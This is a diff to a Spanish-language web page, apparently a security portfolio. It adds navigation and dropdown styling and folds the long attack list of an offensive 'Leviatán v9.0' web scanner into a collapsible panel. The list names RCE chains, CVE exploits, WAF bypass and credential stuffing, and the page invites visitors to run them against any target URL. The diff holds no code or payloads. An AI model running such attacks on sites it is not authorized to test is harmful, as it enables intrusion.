@@ -1606,6 +1606,36 @@ section.in-view::before { opacity: 1; }
 section { position: relative; }
 section .wrap { position: relative; z-index: 1; }
 
+/* ══ QUICK NAV FLOTANTE ══ */
+.quicknav{position:fixed;right:22px;top:50%;transform:translateY(-50%);z-index:9000;display:flex;align-items:center;}
+.quicknav-toggle{position:relative;width:52px;height:52px;border-radius:50%;background:#0a0610;border:1px solid rgba(255,26,46,.4);color:var(--acc);cursor:pointer;display:flex;align-items:center;justify-content:center;font-size:18px;box-shadow:0 0 20px rgba(255,26,46,.15);transition:all .25s;}
+.quicknav-toggle:hover{border-color:var(--acc);box-shadow:0 0 28px rgba(255,26,46,.35);transform:scale(1.06);}
+.quicknav-toggle-ring{position:absolute;inset:-6px;border-radius:50%;border:1px solid rgba(255,26,46,.35);animation:quicknavPulse 2.4s ease-out infinite;}
+.quicknav-toggle-icon{position:relative;z-index:1;animation:quicknavSpin 6s linear infinite;}
+@keyframes quicknavPulse{0%{transform:scale(.85);opacity:.9;}70%{transform:scale(1.35);opacity:0;}100%{opacity:0;}}
+@keyframes quicknavSpin{0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}
+.quicknav-panel{position:absolute;right:64px;top:50%;transform:translateY(-50%) translateX(12px) scale(.92);opacity:0;pointer-events:none;width:250px;max-height:min(70vh,520px);background:#050208;border:1px solid rgba(255,26,46,.3);border-radius:6px;box-shadow:0 12px 40px rgba(0,0,0,.6),0 0 30px rgba(255,26,46,.12);overflow:hidden;display:flex;flex-direction:column;transition:opacity .25s cubic-bezier(.22,1,.36,1),transform .25s cubic-bezier(.22,1,.36,1);}
+.quicknav.open .quicknav-panel{opacity:1;pointer-events:auto;transform:translateY(-50%) translateX(0) scale(1);}
+.quicknav.open .quicknav-toggle-ring{animation-play-state:paused;opacity:0;}
+.quicknav-panel-head{display:flex;align-items:center;justify-content:space-between;padding:12px 14px;border-bottom:1px solid rgba(255,26,46,.2);background:rgba(255,26,46,.05);flex-shrink:0;}
+.quicknav-panel-title{font-family:var(--mono);font-size:10.5px;letter-spacing:.1em;color:var(--acc);font-weight:700;}
+.quicknav-blink{animation:quicknavBlink 1s step-end infinite;}
+@keyframes quicknavBlink{0%,49%{opacity:1;}50%,100%{opacity:0;}}
+.quicknav-close{background:none;border:none;color:rgba(240,238,248,.5);cursor:pointer;font-size:13px;padding:2px 4px;transition:color .2s;}
+.quicknav-close:hover{color:var(--acc);}
+.quicknav-list{overflow-y:auto;padding:6px;}
+.quicknav-item{display:flex;align-items:center;gap:10px;padding:9px 10px;border-radius:3px;font-family:var(--mono);font-size:12px;color:rgba(240,238,248,.65);cursor:pointer;transition:all .15s;text-decoration:none;}
+.quicknav-item:hover{background:rgba(255,26,46,.08);color:var(--text);}
+.quicknav-item.active{background:rgba(255,26,46,.14);color:var(--acc);font-weight:700;}
+.quicknav-item.active::before{content:'▸';margin-right:-4px;}
+.quicknav-item-icon{flex-shrink:0;width:18px;text-align:center;}
+@media(max-width:900px){
+  .quicknav{right:16px;top:auto;bottom:90px;transform:none;}
+  .quicknav-toggle{width:46px;height:46px;font-size:16px;}
+  .quicknav-panel{right:0;top:auto;bottom:60px;transform:translateY(10px) scale(.92);width:min(78vw,270px);}
+  .quicknav.open .quicknav-panel{transform:translateY(0) scale(1);}
+}
+
 /* Línea de progreso lateral */
 .side-progress {
   position: fixed;
@@ -1702,7 +1732,11 @@ section .wrap { position: relative; z-index: 1; }
 
 
 /* ══ CABECERAS HTTP ══ */
-.hdrs-tabs { display:flex; flex-wrap:wrap; gap:6px; margin-bottom:28px; }
+.hdrs-dd-wrap { display:flex; align-items:center; gap:10px; margin-bottom:28px; flex-wrap:wrap; }
+.hdrs-dd-label { font-family:var(--mono); font-size:12px; color:rgba(240,238,248,.6); white-space:nowrap; }
+.hdrs-dd { background:#0a0610; border:1px solid var(--line); color:var(--text); font-family:var(--mono); font-size:12px; padding:9px 14px; border-radius:3px; cursor:pointer; min-width:240px; max-width:100%; }
+.hdrs-dd:hover, .hdrs-dd:focus { border-color:var(--acc); outline:none; }
+@media(max-width:600px){ .hdrs-dd-wrap{ flex-direction:column; align-items:flex-start; } .hdrs-dd{ width:100%; } }
 .hdrs-tab  { padding:7px 16px; border:1px solid rgba(255,26,46,.2); border-radius:3px; font-family:var(--mono); font-size:11px; color:rgba(240,238,248,.5); cursor:pointer; transition:all .18s; background:transparent; }
 .hdrs-tab:hover { color:rgba(240,238,248,.85); border-color:rgba(255,26,46,.4); }
 .hdrs-tab.active { color:var(--text); border-color:rgba(255,26,46,.6); background:rgba(255,26,46,.07); }
@@ -1786,6 +1820,11 @@ section .wrap { position: relative; z-index: 1; }
 
 
 /* ══ PAYLOADS ══ */
+.pay-dd-wrap { display:flex; align-items:center; gap:10px; margin-bottom:28px; flex-wrap:wrap; }
+.pay-dd-label { font-family:var(--mono); font-size:12px; color:rgba(240,238,248,.6); white-space:nowrap; }
+.pay-dd { background:#0a0610; border:1px solid var(--line); color:var(--text); font-family:var(--mono); font-size:12px; padding:9px 14px; border-radius:3px; cursor:pointer; min-width:240px; max-width:100%; }
+.pay-dd:hover, .pay-dd:focus { border-color:var(--acc); outline:none; }
+@media(max-width:600px){ .pay-dd-wrap{ flex-direction:column; align-items:flex-start; } .pay-dd{ width:100%; } }
 .pay-grid { display:flex; flex-direction:column; gap:10px; }
 .pay-card { background:rgba(5,2,5,.9); border:1px solid rgba(255,26,46,.15); border-radius:4px; overflow:hidden; }
 .pay-card:hover { border-color:rgba(255,26,46,.3); }
@@ -1886,6 +1925,11 @@ section .wrap { position: relative; z-index: 1; }
 .cve-btn:hover { background:#cc1528; box-shadow:0 0 20px rgba(255,26,46,.4); }
 .cve-btn:disabled { background:rgba(255,26,46,.3); cursor:not-allowed; }
 .cve-filters { display:flex; gap:6px; margin-bottom:24px; flex-wrap:wrap; }
+.cve-vendor-dd-wrap { display:flex; align-items:center; gap:10px; margin-bottom:28px; flex-wrap:wrap; }
+.cve-vendor-dd-label { font-family:var(--mono); font-size:12px; color:rgba(240,238,248,.6); white-space:nowrap; }
+.cve-vendor-dd { background:#0a0610; border:1px solid var(--line); color:var(--text); font-family:var(--mono); font-size:12px; padding:9px 14px; border-radius:3px; cursor:pointer; min-width:220px; max-width:100%; }
+.cve-vendor-dd:hover, .cve-vendor-dd:focus { border-color:var(--acc); outline:none; }
+@media(max-width:600px){ .cve-vendor-dd-wrap{ flex-direction:column; align-items:flex-start; } .cve-vendor-dd{ width:100%; } }
 .cve-filt { font-family:var(--mono); font-size:10px; padding:5px 14px; border-radius:2px; cursor:pointer; border:1px solid rgba(255,255,255,.08); color:rgba(240,238,248,.45); transition:all .15s; }
 .cve-filt:hover,.cve-filt.active { background:rgba(255,26,46,.1); border-color:rgba(255,26,46,.4); color:var(--text); }
 .cve-filt.crit { border-color:rgba(255,82,82,.3); color:#ff5252; }
@@ -2279,7 +2323,48 @@ a{color:inherit;text-decoration:none;}
 .scan-btn:hover{box-shadow:0 0 50px rgba(255,26,46,.55);transform:translateY(-2px);}
 .scan-btn:disabled{opacity:.4;cursor:not-allowed;transform:none;}
 
-.scan-phases{display:grid;grid-template-columns:repeat(8,1fr);gap:4px;margin-bottom:24px;}
+.scan-attacks-dd{margin:18px 0 32px;border:1px solid rgba(255,26,46,.25);border-radius:4px;background:rgba(255,26,46,.03);overflow:hidden;}
+.scan-attacks-dd-summary{list-style:none;cursor:pointer;padding:14px 18px;display:flex;align-items:center;gap:10px;font-family:var(--mono);color:var(--acc);font-weight:700;letter-spacing:.03em;user-select:none;transition:background .2s;}
+.scan-attacks-dd-summary::-webkit-details-marker{display:none;}
+.scan-attacks-dd-summary:hover{background:rgba(255,26,46,.08);}
+.scan-attacks-dd-icon{font-size:16px;}
+.scan-attacks-dd-text{flex:1;font-size:13px;}
+.scan-attacks-dd-count{color:rgba(240,238,248,.5);font-weight:400;}
+.scan-attacks-dd-arrow{transition:transform .25s;color:rgba(240,238,248,.5);}
+.scan-attacks-dd[open] .scan-attacks-dd-arrow{transform:rotate(180deg);}
+.scan-attacks-dd-body{margin:0;padding:0 18px 18px;border-top:1px solid rgba(255,26,46,.15);padding-top:14px;max-height:420px;overflow-y:auto;scrollbar-width:thin;scrollbar-color:rgba(255,26,46,.4) rgba(255,26,46,.05);}
+.scan-attacks-dd-body::-webkit-scrollbar{width:8px;}
+.scan-attacks-dd-body::-webkit-scrollbar-track{background:rgba(255,26,46,.05);border-radius:4px;}
+.scan-attacks-dd-body::-webkit-scrollbar-thumb{background:rgba(255,26,46,.35);border-radius:4px;}
+.scan-attacks-dd-body::-webkit-scrollbar-thumb:hover{background:rgba(255,26,46,.6);}
+
+.scan-phases-dd{margin-bottom:24px;border:1px solid rgba(255,26,46,.25);border-radius:4px;background:rgba(255,26,46,.03);overflow:hidden;}
+.scan-phases-dd-summary{list-style:none;cursor:pointer;padding:14px 18px;display:flex;align-items:center;gap:10px;font-family:var(--mono);color:var(--acc);font-weight:700;letter-spacing:.03em;user-select:none;transition:background .2s;}
+.scan-phases-dd-summary::-webkit-details-marker{display:none;}
+.scan-phases-dd-summary:hover{background:rgba(255,26,46,.08);}
+.scan-phases-dd-icon{font-size:16px;}
+.scan-phases-dd-text{flex:1;font-size:13px;}
+.scan-phases-dd-count{color:rgba(240,238,248,.5);font-weight:400;}
+.scan-phases-dd-arrow{transition:transform .25s;color:rgba(240,238,248,.5);}
+.scan-phases-dd[open] .scan-phases-dd-arrow{transform:rotate(180deg);}
+.scan-phases-dd .scan-phases{display:grid;grid-template-columns:repeat(8,1fr);gap:4px;margin:0;padding:14px 18px 18px;border-top:1px solid rgba(255,26,46,.15);}
+@media(max-width:600px){.scan-phases-dd .scan-phases{grid-template-columns:repeat(4,1fr);}}
+
+@keyframes levDdBreathe{0%,100%{box-shadow:inset 0 0 0 rgba(255,26,46,0);border-color:rgba(255,26,46,.25);}50%{box-shadow:inset 0 0 22px rgba(255,26,46,.10);border-color:rgba(255,26,46,.5);}}
+@keyframes levDdBreatheAmber{0%,100%{box-shadow:inset 0 0 0 rgba(255,176,32,0);border-color:rgba(255,176,32,.3);}50%{box-shadow:inset 0 0 22px rgba(255,176,32,.12);border-color:rgba(255,176,32,.6);}}
+.scan-attacks-dd{border-left:3px solid var(--acc);animation:levDdBreathe 5s ease-in-out infinite;}
+.scan-phases-dd{border-left:3px solid var(--amber);animation:levDdBreatheAmber 5s ease-in-out infinite;animation-delay:2.4s;}
+.scan-attacks-dd-icon,.scan-phases-dd-icon{display:inline-block;transition:transform .35s cubic-bezier(.34,1.56,.64,1),filter .35s;}
+.scan-attacks-dd-summary:hover .scan-attacks-dd-icon{transform:scale(1.3) rotate(-10deg);filter:drop-shadow(0 0 6px var(--acc));}
+.scan-phases-dd-summary:hover .scan-phases-dd-icon{transform:scale(1.3) rotate(10deg);filter:drop-shadow(0 0 6px var(--amber));}
+.scan-phases-dd-summary{color:var(--amber);}
+.scan-attacks-dd-count,.scan-phases-dd-count{padding:2px 9px;border:1px solid rgba(240,238,248,.18);border-radius:20px;font-size:10.5px;letter-spacing:.04em;transition:border-color .25s,color .25s;}
+.scan-attacks-dd-summary:hover .scan-attacks-dd-count{border-color:rgba(255,26,46,.5);color:var(--acc);}
+.scan-phases-dd-summary:hover .scan-phases-dd-count{border-color:rgba(255,176,32,.5);color:var(--amber);}
+.scan-attacks-dd-arrow,.scan-phases-dd-arrow{font-size:14px;}
+.scan-phases-dd[open] .scan-phases-dd-arrow{color:var(--amber);}
+.scan-attacks-dd[open]{animation-play-state:paused;box-shadow:inset 0 0 26px rgba(255,26,46,.14);}
+.scan-phases-dd[open]{animation-play-state:paused;box-shadow:inset 0 0 26px rgba(255,176,32,.16);}
 @media(max-width:1100px){.scan-phases{grid-template-columns:repeat(7,1fr);}}
 @media(max-width:900px){.scan-phases{grid-template-columns:repeat(6,1fr);}}
 @media(max-width:700px){.scan-phases{grid-template-columns:repeat(5,1fr);}}
@@ -2632,6 +2717,21 @@ a{color:inherit;text-decoration:none;}
   </div>
 </div>
 <div class="mega-overlay" id="mega-overlay"></div>
+
+<!-- ══ QUICK NAV FLOTANTE ══ -->
+<div class="quicknav" id="quicknav">
+  <button class="quicknav-toggle" id="quicknav-toggle" aria-label="Navegacion rapida" title="Navegacion rapida">
+    <span class="quicknav-toggle-ring"></span>
+    <span class="quicknav-toggle-icon">◉</span>
+  </button>
+  <div class="quicknav-panel" id="quicknav-panel">
+    <div class="quicknav-panel-head">
+      <span class="quicknav-panel-title"><span class="quicknav-blink">_</span> NAVEGACION RAPIDA</span>
+      <button class="quicknav-close" id="quicknav-close" aria-label="Cerrar">✕</button>
+    </div>
+    <div class="quicknav-list" id="quicknav-list"></div>
+  </div>
+</div>
 <div class="mm" id="mm">
   <div class="mm-close" id="mm-close">Cerrar ×</div>
   <a href="#sobre-mi" class="mm-link">Sobre mí</a>
@@ -2871,7 +2971,15 @@ a{color:inherit;text-decoration:none;}
     <div class="scan-sec-num">26 - WEB SCANNER // MODO LEVIATAN v9.0</div>
     <div class="lev-subtitle"><span class="lev-skull">💀</span> DESATA EL LEVIATÁN <span class="lev-skull">💀</span></div>
     <h2 class="scan-sec-title lev-title">MODO <span class="lev-acc">LEVIATÁN v9.0</span></h2>
-    <p class="scan-sub">Motor de auditoría ofensiva de <b class="r">AGRESIVIDAD ABSOLUTA</b>. Ingresa una URL y el <b>Leviatán v9.0</b> despliega <b class="r">350 FASES REALES DE ANIQUILACIÓN TOTAL</b>: resolución DNS, transporte SSL/TLS, headers, CORS, <b class="r">adaptive wordlists + parameter mining</b>, robots/sitemap, parámetros peligrosos, fingerprint, <b class="r">cookies (cookie injection, session fixation, JWT decode, cookie tossing, auth bypass)</b>, <b class="r">métodos HTTP agresivos (PUT/DELETE/PATCH/TRACE/CONNECT con payloads reales, method override, verb tampering, WebDAV)</b>, <b>enumeración de subdominios</b>, <b>escaneo de puertos</b>, <b>mutation engine + OOB callbacks (interactsh)</b>, <b>CRLF / Header Injection</b>, <b>NoSQL Injection</b>, <b>Prototype Pollution</b>, <b>HTTP Request Smuggling</b>, <b>Race Conditions</b>, <b>API Abuse / IDOR / Mass Assignment</b>, <b>XXE Injection</b>, <b>SSTI</b>, <b>LDAP Injection</b>, <b>XPath Injection</b>, <b>Host Header Injection</b>, <b>Insecure Deserialization</b>, <b>File Upload Abuse</b>, <b>WebSocket Abuse (CSWSH)</b>, <b>OAuth/SSO Misconfiguration</b>, <b>LLM Prompt Injection</b>, <b>ReDoS</b>, <b>HTTP Parameter Pollution (HPP)</b>, <b>DNS Rebinding</b>, <b>Source Map Exposure</b>, <b>Cloud Bucket Enumeration</b>, <b>Open Redirect</b>, <b>Path Traversal / LFI</b>, <b>Command Injection</b>, <b>JWT Analysis</b>, <b>SSRF Deep Scan</b>, <b>Subdomain Takeover</b>, <b>Cache Poisoning</b>, <b>WordPress</b>, <b>GraphQL</b>, <b>SQLi Blind</b>, <b>XSS DOM</b>, <b>CSRF</b>, <b>Session Hijacking</b>, <b>Business Logic Abuse</b>, <b>HTTP/2 Rapid Reset</b>, <b>Clickjacking</b>, <b>IPv6 Enum</b>, <b>Virtual Host Brute</b>, <b>Backup File Discovery</b>, <b>Config File Exposure</b>, <b>WAF Evasion</b>, <b>Container Escape</b>, <b>Kubernetes API</b>, <b>Docker Registry</b>, <b>.git/.svn/.hg Exposure</b>, <b>OOB/Blind Callbacks (interactsh, DNS exfil)</b>, <b>Auth Context Engine (multi-rol, IDOR activo, Mass Assignment real)</b>, <b>JWT Advanced (alg confusion, jku/x5u, kid traversal)</b>, <b>OAuth/OIDC/SAML Abuse</b>, <b>MFA/OTP Bypass</b>, <b>HTTP/1.1 + HTTP/2 Smuggling real (CL.TE, TE.CL, single-packet race)</b>, <b>Cloud Metadata SSRF (IMDSv1/v2, GCP, Azure)</b>, <b>Kubernetes/Docker/CI-CD Attack Surface</b>, <b>Supply Chain (dependency confusion, secrets verificados)</b>, <b>Parameter Mining (Arjun-style)</b>, <b>Adaptive Wordlists + Mutation Engine</b>, <b>Headless Browser (DOM XSS real, postMessage, prototype pollution client-side)</b>, <b>GraphQL Deep + gRPC + OpenAPI Abuse</b>, <b>WAF Fingerprint + Encoding Diferencial</b>, <b>Crypto Attacks (padding oracle, CBC bit-flip, hash length extension)</b>, <b>Correlation Engine (48 cadenas de exploit)</b>, <b>PoC Verificado No Destructivo</b>, <b>Proxy Rotation + Distributed Scanning</b>, <b>Evidence Capture + Compliance Mapping (OWASP/CWE/CVSS)</b>, <b>SQLi 2nd Order + WAF Bypass</b>, <b>Mutation XSS (mXSS)</b>, <b>Service Worker Exploitation</b>, <b>SSRF Internal Port Scan + Redis RCE</b>, <b>SSRF Cloud Takeover Chain</b>, <b>TOCTOU + DB Race Conditions</b>, <b>Deser Multi-lang (Java/.NET/PHP/Python)</b>, <b>GraphQL Batching + Depth DoS</b>, <b>S3 Bucket Takeover + IAM Privesc + Lambda Abuse</b>, <b>API Gateway Bypass</b>, <b>Prompt Injection Chain + RAG Poisoning + Model Extraction</b>, <b>DNSSEC Zone Walk</b>, <b>Web Cache Deception + CDN Bypass</b>, <b>Password Reset ATO Chain + MFA Fatigue</b>, <b>HTTP/3 QUIC + WebRTC Leak</b>, <b>PostMessage + CORS Exploitation Chains</b>, <b>Content-Type + MIME Sniffing Confusion</b>, <b>WebDAV Deep + Git/SVN/Mercurial Exploitation</b>, <b>Cloudflare/Akamai/ModSecurity WAF Bypass</b>, <b>JA3/JA4 TLS Fingerprinting</b>, <b>Certificate Transparency + Wayback Machine + Shodan Correlation</b>, <b>CVE Matching + 0-Day Hunting</b>, <b>Host Header Poisoning Deep</b>, <b>Prototype Pollution Server-Side</b>, <b>HPP Deep</b>, <b>WebSocket CSWSH</b>, <b>gRPC/OpenAPI Abuse</b>, <b>DNS Rebinding Protection</b>, <b>K8s/Docker API Deep</b>, <b>LLM Prompt Injection + RAG Poisoning</b>, <b>Web Cache Deception</b>, <b>CVE Exploit Correlation (107 CVEs)</b>, análisis de contenido (<b>207 patrones de secretos</b>), <b class="r">GraphQL Alias Abuse, OAuth Redirect URI Hijacking, JWT RS256/HS256 Confusion, 2FA/OTP Race Condition, Password Reset Token Enumeration, API Rate Limit Bypass, CRLF Parameter Injection, Blind SSRF Error-based, Certificate Transparency Subdomain Enum, Cloud Metadata Deep (AWS/GCP/Azure), Container Runtime Detection, API Versioning Abuse, Web Cache Deception Deep, DNS Rebinding Bypass, Server-Side PP via JSON, GraphQL Mutation Abuse, HTTP/2 H2C Desync, CORS Credential Theft Chain, JWT Claim Manipulation, Session Puzzle Attack, IDOR Deep Enum, Business Logic Flow Bypass, API Parameter Pollution, Blind Command Injection (time-based), Second-order SQLi, Stored XSS, HTTP Method Override Bypass, API Key Enumeration, SAML Assertion Injection, Open Redirect→SSRF Chain, Path Traversal Encoding Bypass, NoSQLi via JSON, HTTP CL.TE Desync, HTTP/2 Single-Packet Race, GraphQL Introspection Alternatives, Cloud Bucket Misconfig Deep, Docker API Exposure, K8s API Exposure, Etcd/Redis/MongoDB/Elasticsearch/Memcached Exposure, Jenkins/GitLab/Consul/Spring Boot Actuator Deep, AWS IAM Role Enum, GCP Service Account Detection, Azure Managed Identity Detection, OAuth Token Theft, SAML XSW Attack, OpenID Connect Abuse, Password Reset Poisoning Chain, MFA Fatigue Attack, HTTP/3 QUIC Detection, WebRTC IP Leak, Service Worker Abuse, Web Cache Deception via Path, CDN Origin IP Discovery, WAF Bypass via Encoding, SQLi via JSON, XSS via SVG Upload, CSRF via WebSocket, Race Condition on Balance/Credits, IDOR via UUID Prediction, Mass Data Export Abuse, GraphQL Cost Analysis Bypass, Blind XSS Detection, SSRF via PDF Generators (Server-Side XSS), BaaS & IdP Exploitation (Firebase/Cognito/Supabase), GraphQL CSRF (Bypass de Preflight), Fat GET Cache Poisoning, Client-Side Dependency Hijacking, H2.TE/H2.CL Smuggling (Downgrade Attacks), SMTP Header Injection, Unicode Homoglyph WAF Bypass, Type Juggling/Magic Hash Auth Bypass, JSONP Callback Hijacking, Reflected File Download (RFD), Webshell/Backdoor Detection, WebSocket Compression Bomb, gRPC Reflection Abuse, S3 Object Versioning Exploitation, GraphQL Field Suggestion Leak, Cloud Storage Non-AWS Enum (R2/DO/B2/Wasabi), NTLM Relay/SMB/WinRM Exposure, Blind RCE Detection (Time-based + OOB), Auth Bypass Deep (Default Creds + Brute), Credential Stuffing + Password Spraying, Host Header Injection Deep (RCE + Cache Poison), Blind SSRF Advanced (DNS Rebinding + Protocol Smuggling), Mass Assignment → Privilege Escalation, Server-Side Prototype Pollution → RCE Chain, Log4Shell JNDI RCE (CVE-2021-44228), Spring4Shell RCE (CVE-2022-22965), Subdomain CNAME Takeover (50+ fingerprints), JWT Secret Brute-Force (100 secretos comunes), CSP Bypass / Missing CSP Detection, H2C Upgrade Smuggling (HTTP/2 Cleartext), WebSocket Origin Spoofing + Auth Bypass, ImageMagick/ExifTool RCE (ImageTragick + CVE-2021-22204), MOVEit Transfer CVE-2023-34362, Citrix NetScaler CVE-2023-4966, Fortinet FortiGate CVE-2024-21762, F5 BIG-IP CVE-2023-4622, Cloud IAM Exploitation (AWS STS/GCP/Azure), GraphQL Arbitrary File Read, Reverse Proxy Auth Bypass (Direct Origin Access), HTTP Request Smuggling CL.TE/TE.CL Real, SSTI Deep (Jinja2/Twig/Freemarker/Velocity/Smarty/Mako), NoSQL Injection Deep (MongoDB/Redis/CouchDB), XXE Injection Deep (SOAP/SVG/XML-RPC), SQL Injection Deep (Error/UNION/Blind/Time-based), XSS Deep (Reflected/Stored/DOM/Mutation/Framework Bypass), OAuth/OIDC Token Theft Deep (Auth Code/Implicit/PKCE Bypass), Path Traversal/LFI Deep (Encoding Bypass/Null Byte/PHP Filter), Command Injection Deep (Time-based/OOB/Filter Bypass), Race Condition Deep (TOCTOU/Balance/Coupon/Rate Limit), Final Destrozo Correlation Engine</b>, heurísticas y reporte. <b class="r">DESTROZO ABSOLUTO. 350 FASES REALES. Agresividad absoluta. Prepárate para la aniquilación. 💀🔥</b></p>
+    <p class="scan-sub">Motor de auditoría ofensiva de <b class="r">AGRESIVIDAD ABSOLUTA</b>. Ingresa una URL y el <b>Leviatán v9.0</b> despliega <b class="r">350 FASES REALES DE ANIQUILACIÓN TOTAL</b>: </p>
+    <details class="scan-attacks-dd">
+      <summary class="scan-attacks-dd-summary">
+        <span class="scan-attacks-dd-icon">🩸</span>
+        <span class="scan-attacks-dd-text">Ataques que va a sufrir tu target <span class="scan-attacks-dd-count">(ver las 350 fases en detalle)</span></span>
+        <span class="scan-attacks-dd-arrow">▾</span>
+      </summary>
+      <p class="scan-sub scan-attacks-dd-body">resolución DNS, transporte SSL/TLS, headers, CORS, <b class="r">adaptive wordlists + parameter mining</b>, robots/sitemap, parámetros peligrosos, fingerprint, <b class="r">cookies (cookie injection, session fixation, JWT decode, cookie tossing, auth bypass)</b>, <b class="r">métodos HTTP agresivos (PUT/DELETE/PATCH/TRACE/CONNECT con payloads reales, method override, verb tampering, WebDAV)</b>, <b>enumeración de subdominios</b>, <b>escaneo de puertos</b>, <b>mutation engine + OOB callbacks (interactsh)</b>, <b>CRLF / Header Injection</b>, <b>NoSQL Injection</b>, <b>Prototype Pollution</b>, <b>HTTP Request Smuggling</b>, <b>Race Conditions</b>, <b>API Abuse / IDOR / Mass Assignment</b>, <b>XXE Injection</b>, <b>SSTI</b>, <b>LDAP Injection</b>, <b>XPath Injection</b>, <b>Host Header Injection</b>, <b>Insecure Deserialization</b>, <b>File Upload Abuse</b>, <b>WebSocket Abuse (CSWSH)</b>, <b>OAuth/SSO Misconfiguration</b>, <b>LLM Prompt Injection</b>, <b>ReDoS</b>, <b>HTTP Parameter Pollution (HPP)</b>, <b>DNS Rebinding</b>, <b>Source Map Exposure</b>, <b>Cloud Bucket Enumeration</b>, <b>Open Redirect</b>, <b>Path Traversal / LFI</b>, <b>Command Injection</b>, <b>JWT Analysis</b>, <b>SSRF Deep Scan</b>, <b>Subdomain Takeover</b>, <b>Cache Poisoning</b>, <b>WordPress</b>, <b>GraphQL</b>, <b>SQLi Blind</b>, <b>XSS DOM</b>, <b>CSRF</b>, <b>Session Hijacking</b>, <b>Business Logic Abuse</b>, <b>HTTP/2 Rapid Reset</b>, <b>Clickjacking</b>, <b>IPv6 Enum</b>, <b>Virtual Host Brute</b>, <b>Backup File Discovery</b>, <b>Config File Exposure</b>, <b>WAF Evasion</b>, <b>Container Escape</b>, <b>Kubernetes API</b>, <b>Docker Registry</b>, <b>.git/.svn/.hg Exposure</b>, <b>OOB/Blind Callbacks (interactsh, DNS exfil)</b>, <b>Auth Context Engine (multi-rol, IDOR activo, Mass Assignment real)</b>, <b>JWT Advanced (alg confusion, jku/x5u, kid traversal)</b>, <b>OAuth/OIDC/SAML Abuse</b>, <b>MFA/OTP Bypass</b>, <b>HTTP/1.1 + HTTP/2 Smuggling real (CL.TE, TE.CL, single-packet race)</b>, <b>Cloud Metadata SSRF (IMDSv1/v2, GCP, Azure)</b>, <b>Kubernetes/Docker/CI-CD Attack Surface</b>, <b>Supply Chain (dependency confusion, secrets verificados)</b>, <b>Parameter Mining (Arjun-style)</b>, <b>Adaptive Wordlists + Mutation Engine</b>, <b>Headless Browser (DOM XSS real, postMessage, prototype pollution client-side)</b>, <b>GraphQL Deep + gRPC + OpenAPI Abuse</b>, <b>WAF Fingerprint + Encoding Diferencial</b>, <b>Crypto Attacks (padding oracle, CBC bit-flip, hash length extension)</b>, <b>Correlation Engine (48 cadenas de exploit)</b>, <b>PoC Verificado No Destructivo</b>, <b>Proxy Rotation + Distributed Scanning</b>, <b>Evidence Capture + Compliance Mapping (OWASP/CWE/CVSS)</b>, <b>SQLi 2nd Order + WAF Bypass</b>, <b>Mutation XSS (mXSS)</b>, <b>Service Worker Exploitation</b>, <b>SSRF Internal Port Scan + Redis RCE</b>, <b>SSRF Cloud Takeover Chain</b>, <b>TOCTOU + DB Race Conditions</b>, <b>Deser Multi-lang (Java/.NET/PHP/Python)</b>, <b>GraphQL Batching + Depth DoS</b>, <b>S3 Bucket Takeover + IAM Privesc + Lambda Abuse</b>, <b>API Gateway Bypass</b>, <b>Prompt Injection Chain + RAG Poisoning + Model Extraction</b>, <b>DNSSEC Zone Walk</b>, <b>Web Cache Deception + CDN Bypass</b>, <b>Password Reset ATO Chain + MFA Fatigue</b>, <b>HTTP/3 QUIC + WebRTC Leak</b>, <b>PostMessage + CORS Exploitation Chains</b>, <b>Content-Type + MIME Sniffing Confusion</b>, <b>WebDAV Deep + Git/SVN/Mercurial Exploitation</b>, <b>Cloudflare/Akamai/ModSecurity WAF Bypass</b>, <b>JA3/JA4 TLS Fingerprinting</b>, <b>Certificate Transparency + Wayback Machine + Shodan Correlation</b>, <b>CVE Matching + 0-Day Hunting</b>, <b>Host Header Poisoning Deep</b>, <b>Prototype Pollution Server-Side</b>, <b>HPP Deep</b>, <b>WebSocket CSWSH</b>, <b>gRPC/OpenAPI Abuse</b>, <b>DNS Rebinding Protection</b>, <b>K8s/Docker API Deep</b>, <b>LLM Prompt Injection + RAG Poisoning</b>, <b>Web Cache Deception</b>, <b>CVE Exploit Correlation (107 CVEs)</b>, análisis de contenido (<b>207 patrones de secretos</b>), <b class="r">GraphQL Alias Abuse, OAuth Redirect URI Hijacking, JWT RS256/HS256 Confusion, 2FA/OTP Race Condition, Password Reset Token Enumeration, API Rate Limit Bypass, CRLF Parameter Injection, Blind SSRF Error-based, Certificate Transparency Subdomain Enum, Cloud Metadata Deep (AWS/GCP/Azure), Container Runtime Detection, API Versioning Abuse, Web Cache Deception Deep, DNS Rebinding Bypass, Server-Side PP via JSON, GraphQL Mutation Abuse, HTTP/2 H2C Desync, CORS Credential Theft Chain, JWT Claim Manipulation, Session Puzzle Attack, IDOR Deep Enum, Business Logic Flow Bypass, API Parameter Pollution, Blind Command Injection (time-based), Second-order SQLi, Stored XSS, HTTP Method Override Bypass, API Key Enumeration, SAML Assertion Injection, Open Redirect→SSRF Chain, Path Traversal Encoding Bypass, NoSQLi via JSON, HTTP CL.TE Desync, HTTP/2 Single-Packet Race, GraphQL Introspection Alternatives, Cloud Bucket Misconfig Deep, Docker API Exposure, K8s API Exposure, Etcd/Redis/MongoDB/Elasticsearch/Memcached Exposure, Jenkins/GitLab/Consul/Spring Boot Actuator Deep, AWS IAM Role Enum, GCP Service Account Detection, Azure Managed Identity Detection, OAuth Token Theft, SAML XSW Attack, OpenID Connect Abuse, Password Reset Poisoning Chain, MFA Fatigue Attack, HTTP/3 QUIC Detection, WebRTC IP Leak, Service Worker Abuse, Web Cache Deception via Path, CDN Origin IP Discovery, WAF Bypass via Encoding, SQLi via JSON, XSS via SVG Upload, CSRF via WebSocket, Race Condition on Balance/Credits, IDOR via UUID Prediction, Mass Data Export Abuse, GraphQL Cost Analysis Bypass, Blind XSS Detection, SSRF via PDF Generators (Server-Side XSS), BaaS & IdP Exploitation (Firebase/Cognito/Supabase), GraphQL CSRF (Bypass de Preflight), Fat GET Cache Poisoning, Client-Side Dependency Hijacking, H2.TE/H2.CL Smuggling (Downgrade Attacks), SMTP Header Injection, Unicode Homoglyph WAF Bypass, Type Juggling/Magic Hash Auth Bypass, JSONP Callback Hijacking, Reflected File Download (RFD), Webshell/Backdoor Detection, WebSocket Compression Bomb, gRPC Reflection Abuse, S3 Object Versioning Exploitation, GraphQL Field Suggestion Leak, Cloud Storage Non-AWS Enum (R2/DO/B2/Wasabi), NTLM Relay/SMB/WinRM Exposure, Blind RCE Detection (Time-based + OOB), Auth Bypass Deep (Default Creds + Brute), Credential Stuffing + Password Spraying, Host Header Injection Deep (RCE + Cache Poison), Blind SSRF Advanced (DNS Rebinding + Protocol Smuggling), Mass Assignment → Privilege 